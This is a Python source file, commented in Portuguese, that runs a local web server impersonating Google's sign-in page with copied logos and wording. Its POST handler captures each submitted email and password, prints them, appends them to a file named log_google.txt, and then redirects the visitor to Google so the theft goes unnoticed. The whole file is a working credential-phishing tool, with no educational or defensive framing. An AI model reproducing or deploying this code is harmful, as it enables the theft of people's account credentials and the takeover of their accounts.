import http.server
import socketserver
import urllib.parse

# Port where the server will run
PORT = 8080

# HTML content for the login page
html_content = """
<!DOCTYPE html>
<html>
<head>
<!-- Favicon -->
   <link rel="icon" type="image/x-icon" href="https://img1.gratispng.com/20180412/oje/kisspng-google-logo-google-search-advertising-google-5acf6362e55785.2911993015235408349394.jpg">  
<center>
    <title>One account. All of Google.</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #fff;
           
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            width: 400px;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        img#google-logo {
            height: 40px; /* Altura reduzida */
            margin-bottom: 20px;
        }
        img#avatar {
            width: 100px; /* Largura ajustada */
            height: 100px; /* Altura ajustada */
            border-radius: 50%; /* Arredonda a imagem */
            margin-bottom: 10px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            height: 40px;
            margin-bottom: 10px;
            padding: 0 10px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            height: 40px;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        .footer {
            font-size: 12px;
            margin-top: 20px;
        }
        img#logo-accounts {
            height: 20px; /* Altura ajustada para diminuir */
        }
        h5 {
            font-size: 15px;
            color: #757575; /* Cor cinza */
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img id="google-logo" src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
        <h1 style="font-size: 24px;">Sign in with your Google Account</h1>
        <h5>Sign in to Gmail account</h5>
        <img id="avatar" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Login Image">
        <form method="post" action="/">
            <input type="text" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
        <img id="google-logo" src="https://www.ufpb.br/ccau/contents/imagens/home/branco.png/@@images/image.png" alt="Google">
        <h1 style="font-size: 24px;"> </h1>
        <div class="footer">        
           
            <h5>One Google Account for everything Google</h5>
            
            <img id="logo-accounts" src="https://ssl.gstatic.com/accounts/ui/logo_strip_2x.png" alt="Logotipo do Google">
        </div>
    </div>
    </center>
</body>
</html>
"""

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Responde com o conteúdo HTML
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(html_content.encode("utf-8"))

    def do_POST(self):
        # Lê o comprimento do corpo da solicitação
        content_length = int(self.headers['Content-Length'])
        # Lê o corpo da solicitação
        post_data = self.rfile.read(content_length)
        # Faz o parsing dos dados do formulário
        fields = urllib.parse.parse_qs(post_data.decode('utf-8'))
        
        email = fields.get('email', [''])[0]
        password = fields.get('password', [''])[0]
        
        # Loga as credenciais no terminal e no arquivo
        log_entry = f"Email: {email}\nPassword: {password}"
        print(log_entry)
        with open("log_google.txt", "a") as log_file:
            log_file.write(log_entry + "\n")
        
        # Redireciona para o Google
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com.br/')
        self.end_headers()

# Cria o servidor HTTP
with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
    print(f"Servidor rodando na porta {PORT}")
    print("Acesse o servidor em: http://127.0.0.1:8080")
    print("===========================================\n\n")
    httpd.serve_forever()
